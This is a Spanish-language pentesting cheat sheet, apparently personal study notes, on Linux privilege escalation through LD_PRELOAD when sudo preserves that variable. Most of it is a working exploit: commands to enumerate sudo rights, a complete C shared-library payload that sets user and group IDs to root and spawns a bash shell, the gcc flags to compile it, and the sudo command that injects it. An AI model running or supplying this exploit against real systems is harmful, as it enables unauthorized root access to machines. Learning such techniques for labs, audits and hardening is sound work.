---
tags:
  - linux
  - privex
---
## Conceptos Clave (TL;DR)
* Los programas en Linux utilizan bibliotecas compartidas para evitar tener que reescribir el mismo código a través de múltiples programas, existiendo bibliotecas estáticas (.a) y dinámicas (.so).
* A diferencia de las bibliotecas estáticas que se vuelven parte inalterable del programa, las bibliotecas dinámicas pueden ser modificadas para controlar la ejecución del programa que las llama.
* La variable de entorno `LD_PRELOAD` permite cargar una biblioteca específica antes de ejecutar un binario, otorgándole preferencia a sus funciones por sobre las funciones predeterminadas.
* Si un usuario posee privilegios de `sudo` y la configuración preserva el entorno de esta variable (`env_keep+=LD_PRELOAD`), se puede explotar ejecutando una biblioteca compartida personalizada para escalar privilegios.

## Herramientas Clave
* **ldd:** Utilidad usada para visualizar los objetos compartidos (bibliotecas) requeridos por un binario específico.
* **gcc:** Compilador utilizado para transformar el código fuente en C de nuestro payload en un archivo de objeto compartido dinámico (.so).

## Metodología Paso a Paso
* **Fase 1: Enumeración de Privilegios:** El primer paso es verificar los privilegios de `sudo` del usuario actual para confirmar si la configuración retiene la variable `LD_PRELOAD` en el entorno. Esto justifica si el vector de ataque es aplicable.
* **Fase 2: Creación del Payload en C:** Se debe escribir una biblioteca personalizada en C que, al ser inicializada, elimine la variable del entorno para evitar bucles infinitos, asigne los IDs de usuario/grupo a root y genere una shell de Bash.
* **Fase 3: Compilación de la Biblioteca:** Se compila el código fuente escrito en el paso anterior en un objeto compartido (.so) utilizando `gcc` con las banderas adecuadas para la inyección.
* **Fase 4: Ejecución del Ataque:** Finalmente, se ejecuta el comando permitido por `sudo`, pasándole la variable `LD_PRELOAD` con la ruta de la biblioteca recién compilada para secuestrar el flujo de ejecución y obtener acceso de root.

## Cheat Sheet de Comandos

```bash
# Muestra las bibliotecas compartidas requeridas por el binario indicado
ldd <BINARY_PATH>
```

```bash
# Lista los privilegios de sudo del usuario actual. 
# Buscar: "env_keep+=LD_PRELOAD" y los comandos permitidos.
sudo -l
```

```c
// Payload de la biblioteca maliciosa. Guardar como <PAYLOAD_NAME>.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
# Compila el payload en un objeto compartido dinamico (.so)
# -fPIC: Position Independent Code (requerido para bibliotecas compartidas).
# -shared: Produce un objeto compartido.
# -nostartfiles: No usa los archivos de inicio estandar del sistema.
gcc -fPIC -shared -o <PAYLOAD_NAME>.so <PAYLOAD_NAME>.c -nostartfiles
```

```bash
# Ejecuta el binario permitido inyectando el payload para obtener la shell root.
sudo LD_PRELOAD=<ABSOLUTE_PATH_TO_SO_FILE> <ALLOWED_SUDO_COMMAND>
```

## "Gotchas" y Troubleshooting
* **Requisito Previos Estrictos:** Para que la escalada de privilegios funcione, el usuario debe tener privilegios de `sudo` y la directiva `env_keep+=LD_PRELOAD` debe estar presente en el resultado de `sudo -l`.
* **Limitaciones de GTFOBins:** Esta técnica es útil incluso cuando el comando permitido en `sudo` requiere rutas absolutas y no es un binario comúnmente explotable mediante GTFOBins (ej. `/usr/sbin/apache2 restart`).
* **Rutas Absolutas:** Al ejecutar el comando de escalada, debes asegurarte de especificar la ruta completa y absoluta hacia el archivo de la biblioteca maliciosa en la variable de entorno.